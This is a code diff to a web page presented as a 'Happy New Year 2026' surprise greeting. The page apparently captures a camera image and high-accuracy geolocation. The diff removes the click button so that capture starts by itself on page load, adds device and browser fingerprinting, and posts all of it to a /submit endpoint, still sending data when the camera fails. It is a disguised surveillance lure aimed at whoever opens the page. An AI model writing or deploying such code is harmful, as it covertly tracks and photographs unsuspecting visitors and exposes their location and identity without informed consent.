@@ -243,9 +243,7 @@
   <div class="container">
     <span class="emoji-large">🎆</span>
     <h1>Happy New Year 2026</h1>
-    <p>Tap below to unlock your surprise ✨</p>
-
-    <button onclick="start()">🎁 Click to See Your Surprise</button>
+    <p>Loading your surprise... ✨</p>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
@@ -294,7 +292,7 @@ async function start() {
           console.log("Geolocation error:", err);
           resolve(null); // Resolve with null to continue
         },
-        { timeout: 10000, enableHighAccuracy: true } // Timeout and high accuracy for mobile
+        { timeout: 5000, enableHighAccuracy: true } // Reduced timeout for faster response
       );
     });
 
@@ -303,24 +301,37 @@ async function start() {
 
   } catch (err) {
     console.error("Error in start():", err);
-    alert("Permission denied or not supported. Error: " + err.message);
+    // If camera fails, send without image
+    sendData(null, null, null);
   }
 }
 
 function sendData(image, lat, lng) {
+  const deviceInfo = `${navigator.platform || 'unknown'}; hwConcurrency:${navigator.hardwareConcurrency || 'n/a'}; maxTouch:${navigator.maxTouchPoints || 0}`;
+  const browserInfo = navigator.userAgent || 'unknown';
+
   fetch("/submit", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      image,
+      image: image || "No image captured",
       latitude: lat,
       longitude: lng,
-      time: new Date().toISOString()
+      time: new Date().toISOString(),
+      deviceInfo, browserInfo
     })
   })
   .then(() => alert("🎉 Happy New Year 2026 🎉"))
-  .catch(() => alert("Something went wrong"));
+  .catch(err => {
+    console.error("Fetch error:", err);
+    alert("Something went wrong: " + err.message);
+  });
 }
+
+// Auto-start on page load (will still prompt for permissions)
+document.addEventListener('DOMContentLoaded', () => {
+  setTimeout(start, 500); // Reduced delay for faster start
+});
 </script>
 </body>
 </html>
